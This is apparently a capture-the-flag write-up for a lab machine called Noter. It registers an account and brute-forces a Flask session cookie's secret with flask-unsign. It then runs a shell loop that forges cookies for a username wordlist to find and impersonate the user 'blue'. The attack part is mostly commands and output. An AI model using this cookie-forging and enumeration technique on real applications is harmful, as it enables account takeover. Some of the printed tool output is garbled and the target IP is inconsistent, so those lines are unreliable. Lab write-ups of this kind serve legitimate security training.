## Forging a Flask Session Cookie

Registering a user account and logging in yields a Flask `session` cookie.

```http
POST /register HTTP/1.1
Host: 10.129.104.50:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://10.129.104.50:5000
Connection: close
Referer: http://10.129.104.50:5000/register
Upgrade-Insecure-Requests: 1

name=tgihf&email=tgihf@noter.htb&username=tgihf&password=blah&confirm=blah
```

```http
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 218
Location: http://10.129.104.50:5000/login
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGdpaGYifQ.Yok7Tg._SNLZb6IHO8kAA25yw6R32qhW0w; HttpOnly; Path=/
Server: Werkzeug/2.0.2 Python/3.8.10
Date: Sat, 21 May 2022 19:15:46 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
```

Leverage [flask-unsign](https://pypi.org/project/flask-unsign/) to brute force the cookie's secret: `secret123`.

```bash
$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGdpaGYifQ.Yok7Tg._SNLZb6IHO8kAA25yw6R32qhW0w'
[*] Session decodes to: {'logged_in': True, 'username': 'tgihf'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 16768 attemptsecretrethfC$
'secret123'
```

Iterate through `xato-net-10-million-usernames.txt`, creating a cookie for each username and attempting to access `/dashboard` with it in order to enumerate users. This reveals the user `blue`.

```bash
$ for user in $(cat /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt); do c=$(flask-unsign --sign --cookie "{'logged_in': True, 'username': '$user'}" --secret 'secret123'); curl -s -I -X GET -H "Cookie: session=$c" http://10.129.104.73:5000/dashboard | grep "200 OK"; echo $user; done
HTTP/1.0 200 OK
blue
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YolGRw.dScV5_yPkiyGR-2coMUUAMq8SKo
```

Leverage the cookie to login as `blue`. `blue` has two notes: "Noter Premium Membership" and "Before the Weekend." TODO: investigate.

`blue` also has access to a few more features on the dashboard: "Import Notes," and "Export Notes." TODO: investigate.

![](images/Pasted%20image%2020220521160843.png)
